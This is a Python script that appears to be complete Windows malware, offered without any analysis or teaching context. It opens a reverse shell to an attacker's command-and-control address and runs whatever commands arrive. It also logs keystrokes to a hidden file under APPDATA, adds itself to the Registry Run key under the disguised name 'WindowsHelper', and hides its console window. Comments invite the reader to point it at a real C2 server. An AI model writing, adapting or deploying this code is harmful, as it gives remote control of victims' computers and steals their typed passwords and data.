import os
import time
import socket
import subprocess
import shutil
import sys
import threading
import winreg
from pathlib import Path
from pynput import keyboard

CREATE_NO_WINDOW = 0x08000000  # Hide console window

# Attacker's IP & Port (Change this to an actual external server)
ATTACKER_IP = "192.168.1.100"  # Change this to your C2 server
ATTACKER_PORT = 4444

# Function to establish a reverse shell
def reverse_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            s.send(b"Connected!\n")

            while True:
                command = s.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break

                output = subprocess.run(command, shell=True, capture_output=True)
                s.send(output.stdout + output.stderr)

            s.close()
        except:
            time.sleep(5)  # Retry connection after 5 seconds

# Function to log keystrokes
def keylogger():
    log_file = os.path.join(os.getenv("APPDATA"), "system_logs.txt")

    def on_press(key):
        with open(log_file, "a") as f:
            try:
                f.write(f"{key.char}")
            except AttributeError:
                f.write(f" {key} ")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Function to create persistence (Registry Run Key)
def persistence():
    exe_path = sys.executable  # Path of the current script executable
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "WindowsHelper", 0, winreg.REG_SZ, exe_path)
    except:
        pass

# Function to hide command prompt
def hide_cmd():
    subprocess.Popen("cmd.exe", creationflags=CREATE_NO_WINDOW)

# Start reverse shell, keylogger, and persistence in separate threads
threading.Thread(target=reverse_shell, daemon=True).start()
threading.Thread(target=keylogger, daemon=True).start()
persistence()
hide_cmd()

# Keep script running
while True:
    time.sleep(10)
